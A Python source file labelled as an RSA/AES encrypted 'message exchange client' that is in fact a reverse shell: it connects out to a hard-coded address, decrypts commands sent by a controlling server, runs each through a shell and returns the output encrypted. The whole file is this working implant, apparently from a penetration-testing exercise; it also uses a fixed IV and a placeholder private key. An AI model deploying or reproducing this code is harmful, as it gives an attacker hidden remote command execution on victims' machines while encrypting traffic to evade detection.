#!/usr/bin/env python
# Filename: rsa_rshell_client.py
# This program is optimized for Python 3.4
# Description: Raw socket protected messsage/data exchange client with RSA encryption
#   counterpart: aes_rshell_server.py

import subprocess
import socket
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding

IV = b"H" * 16

def GET_AES(cipher):
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
<Insert RSA Private Key>
-----END RSA PRIVATE KEY-----'''
    private_key = RSA.importKey(privatekey)
    decryptor = PKCS1_OAEP.new(private_key)
    return decryptor.decrypt(cipher).decode()


def encrypt(message):
    encryptor = AES.new(AES_KEY, AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(AES_KEY, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message,
                                      16)
    return decrypted_message


def connect():
    s = socket.socket()
    s.connect(('192.168.0.152', 8080))
    global AES_KEY
    AES_KEY = s.recv(1024)
    AES_KEY = GET_AES(AES_KEY)
    AES_KEY = AES_KEY.encode()
    print(AES_KEY)
    while True:
        command = s.recv(1024)
        
        command = decrypt(command).decode()
        print (command)
        if 'terminte' in command:
            s.close()
            break
        else:
            CMD = subprocess.Popen(command,
                                   shell=True,
                                   stderr=subprocess.PIPE,
                                   stdout=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            result = CMD.stdout.read()
            s.send(encrypt(result))
connect()

